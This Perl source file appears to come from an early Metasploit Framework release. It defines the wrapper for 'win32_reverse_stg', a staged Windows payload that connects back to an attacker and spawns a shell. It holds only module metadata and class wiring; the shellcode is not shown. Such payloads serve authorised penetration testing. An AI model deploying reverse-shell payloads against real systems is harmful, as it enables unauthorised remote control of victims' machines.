package Msf::Payload::win32_reverse_stg;
use strict;
use base 'Msf::PayloadComponent::Win32ShellStage';
sub load {
  Msf::PayloadComponent::Win32ShellStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
    'Name'         => 'winreverse_stg',
    'Version'      => '1.0',
    'Description'  => 'Connect back to attacker and spawn a shell',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
};

sub new {
    load();
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}
